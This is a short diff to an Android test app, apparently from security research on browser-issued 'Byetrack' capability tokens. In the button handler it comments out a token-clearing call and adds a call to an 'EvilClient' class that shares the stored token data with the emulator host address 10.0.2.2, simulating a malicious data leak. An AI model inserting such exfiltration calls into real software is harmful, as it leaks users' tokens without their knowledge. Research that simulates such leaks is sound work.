@@ -15,6 +15,8 @@ import android.util.Log;
 import android.widget.Button;
 import android.widget.TextView;
 
+import de.cispa.evil.EvilClient;
+
 
 public class MainActivity extends AppCompatActivity {
     private static final String LOGTAG = "TestApp";
@@ -54,10 +56,12 @@ public class MainActivity extends AppCompatActivity {
 
         // Simulate storing a received capability from browser
         storeButton.setOnClickListener(v -> {
-            ByetrackDebugHelp.clearTokenStorage(finalPrefs);
+            //ByetrackDebugHelp.clearTokenStorage(finalPrefs);
             //DebugHelp.clearTokenStorage(wildcardPrefs);
             //wildcardTokensStored.setText(DebugHelp.displayWildcardTokens(mContext));
             //finalTokensStored.setText(DebugHelp.displayFinalTokens(mContext));
+
+            EvilClient.shareByetrackData(mContext, "10.0.2.2");
         });
 
         // Simulate launching CT with capability (Note: Firefox does not support TWA)
